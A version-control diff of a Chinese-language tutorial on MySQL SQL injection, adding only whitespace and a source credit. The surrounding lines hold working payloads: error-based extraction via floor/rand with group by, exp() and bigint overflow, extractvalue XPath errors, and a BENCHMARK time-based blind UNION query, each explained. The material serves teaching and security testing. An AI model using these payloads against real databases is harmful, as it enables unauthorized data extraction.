@@ -72,7 +72,7 @@ Explain：正则表达式的用法，user()结果为root，regexp为匹配root�
 `Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;  `   
 
 //explain:此处有三个点，一是需要concat计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql 的bug 的问题。但是此处需要将rand(0)，rand()需要多试几次才行。  
-以上语句可以简化成如下的形式。
+以上语句可以简化成如下的形式。    
 `select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))`
 
 如果关键的表被禁用了，可以使用这种形式  
@@ -96,9 +96,11 @@ mysql> SELECT @t1:=(@t2:=1)+@t3:=4,@t1,@t2,@t3;
 ▲select exp(~(select * FROM(SELECT USER())a))         //double数值类型超出范围  
  //Exp()为以e为底的对数函数；版本在5.5.5及其以上  
 可以参考exp报错文章：http://www.cnblogs.com/lcamry/articles/5509124.html  
+
 ▲select !(select * from (select user())x) -（ps:这是减号） ~0  
 //bigint超出范围；~0是对0逐位取反，很大的版本在5.5.5及其以上  
 可以参考文章bigint溢出文章http://www.cnblogs.com/lcamry/articles/5509112.html  
+
 ▲extractvalue(1,concat(0x7e,(select @@version),0x7e))  se//mysql对xml数据进行查询和修改的xpath函数，xpath语法错误  
 **ExtractValue(xml_str , Xpath)** 函数,使用Xpath表示法从XML格式的字符串中提取一个值  
 **ExtractValue()**  函数中任意一个参数为NULL,返回值都是NULL.  
@@ -128,3 +130,5 @@ mysql> SELECT NAME_CONST('myname', 14);
 **▲UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;**   
 
 //BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()
+
+本文参考SQL注入天书系列文章。
